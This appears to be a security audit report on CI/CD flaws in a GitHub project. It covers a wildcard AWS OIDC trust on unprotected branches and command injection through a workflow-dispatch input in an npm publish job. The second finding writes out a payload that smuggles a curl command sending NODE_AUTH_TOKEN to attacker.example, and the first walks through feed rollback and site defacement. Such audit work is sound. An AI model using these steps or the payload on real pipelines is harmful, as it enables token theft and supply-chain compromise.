1. Title: Wildcard GitHub OIDC trust lets any repo writer assume the deploy role from unprotected `chore/aztec-*` branches.

2. Impact factors: Integrity + Availability + Authorization. Blast radius: all users of the public site/update feed. Data sensitivity: updater metadata, public release routing, hosted playground/landing content. Exploitability: network/control-plane via GitHub Actions and AWS; attack complexity low; privileges required low, meaning any principal with repository branch push/workflow-dispatch capability or a compromised repo token with `contents:write`; user interaction none for deployment, required only when users visit the defaced/phishing site or run update checks.

3. Evidence confidence: high.

4. OWASP category + CWE: OWASP A01 Broken Access Control / A08 Software and Data Integrity Failures; CWE-269 Improper Privilege Management.

5. 6. Missing control: the OIDC `sub` trust is not limited to protected branches, environments, or immutable release refs; the deploy role is not scoped to the exact S3 prefixes each workflow needs; no branch ruleset protects the wildcard branch names that are trusted by AWS.

7. Exploit/violation scenario: A repo writer creates `chore/aztec-stable-pwn`. They run or alter a workflow on that branch with `id-token: write` and `aws-actions/configure-aws-credentials` using the repo’s `AWS_ROLE_ARN`. The OIDC token subject matches `repo:alejoamiras/aztec-accelerator:ref:refs/heads/chore/aztec-stable-*`, so AWS STS issues credentials. The attacker writes `s3://aztec-accelerator-site/landing/releases/latest.json` and invalidates `/releases/latest.json`. Minisign still prevents installing arbitrary unsigned bytes, but it does not stop feed rollback/DoS: the attacker can advertise a high `version` while pointing URLs/signatures at an older legitimately signed release artifact, or point to unavailable/oversized/bad metadata to break updates. The same credentials can overwrite `/landing/*`, `/playground/*`, or `/playground-nightly/*` for defacement or phishing.

8. Preconditions: attacker has repository write/branch-push and workflow-dispatch capability, or compromises a repo principal/token with equivalent `contents:write`; AWS role/secrets match the Terraform configuration.

9. Why existing mitigations fail: branch protection does not cover `chore/aztec-nightlies-*` or `chore/aztec-stable-*`; it covers only `main`. Minisign protects updater artifact bytes, not the authenticity or monotonicity of the unsigned S3-hosted feed. The S3 policy is whole-bucket, so workflow command-level prefix choices do not constrain a malicious or modified workflow after role assumption.

2. Title: Manual SDK publish input is interpolated into shell with npm/GitHub write tokens.

2. Impact factors: Confidentiality + Integrity + Authorization. Blast radius: all consumers of `@alejoamiras/aztec-accelerator` and repository releases/tags. Data sensitivity: `NPM_TOKEN`, `GH_TOKEN`, package publishing authority. Exploitability: GitHub Actions control-plane; attack complexity low; privileges required low, workflow-dispatch permission; user interaction none.

3. Evidence confidence: high.

4. OWASP category + CWE: OWASP A03 Injection; CWE-78 OS Command Injection.

5. Trace: untrusted manual input `dist_tag` enters at [`.github/workflows/_publish-sdk.yml:3`](<.github/workflows/_publish-sdk.yml:3>)-[`.github/workflows/_publish-sdk.yml:15`](<.github/workflows/_publish-sdk.yml:15>). The job has `id-token: write` and `contents: write` at [`.github/workflows/_publish-sdk.yml:36`](<.github/workflows/_publish-sdk.yml:36>)-[`.github/workflows/_publish-sdk.yml:38`](<.github/workflows/_publish-sdk.yml:38>). The publish step exposes `NODE_AUTH_TOKEN` from `secrets.NPM_TOKEN` at [`.github/workflows/_publish-sdk.yml:97`](<.github/workflows/_publish-sdk.yml:97>)-[`.github/workflows/_publish-sdk.yml:101`](<.github/workflows/_publish-sdk.yml:101>) and injects the raw expression into `run:` at [`.github/workflows/_publish-sdk.yml:101`](<.github/workflows/_publish-sdk.yml:101>). The same input is interpolated into the `npm dist-tag add` command at [`.github/workflows/_publish-sdk.yml:103`](<.github/workflows/_publish-sdk.yml:103>)-[`.github/workflows/_publish-sdk.yml:108`](<.github/workflows/_publish-sdk.yml:108>) and into release-note shell assignments in a step carrying `GH_TOKEN` at [`.github/workflows/_publish-sdk.yml:110`](<.github/workflows/_publish-sdk.yml:110>)-[`.github/workflows/_publish-sdk.yml:136`](<.github/workflows/_publish-sdk.yml:136>).

6. Missing control: manual input is not validated as an npm dist-tag and is not passed through `env` plus shell quoting; the directly dispatchable workflow is allowed to run token-bearing publish steps.

7. Exploit/violation scenario: A workflow-dispatch-capable actor runs `_Publish SDK` with `dist_tag` set to `nightlies; curl -fsS https://attacker.example/leak -d "$NODE_AUTH_TOKEN"; #`. GitHub expands the expression before Bash runs the script, producing a second command in the `npm publish` step. That command executes with `NODE_AUTH_TOKEN` in the environment, allowing npm token exfiltration or malicious package publication. A variant using command substitution in the release-note assignment can execute with `GH_TOKEN` in the later release step.

8. Preconditions: attacker can manually dispatch repository workflows with inputs; repository `NPM_TOKEN` is available to the workflow; no protected environment approval gates the publish job.

9. Why existing mitigations fail: npm provenance attests what CI published, but does not stop injected shell from using the same CI identity/token. GitHub secret masking only hides logs; it does not prevent network exfiltration. Using constants from caller workflows is safe for those callers, but the same workflow is directly dispatchable with attacker-supplied `dist_tag`.
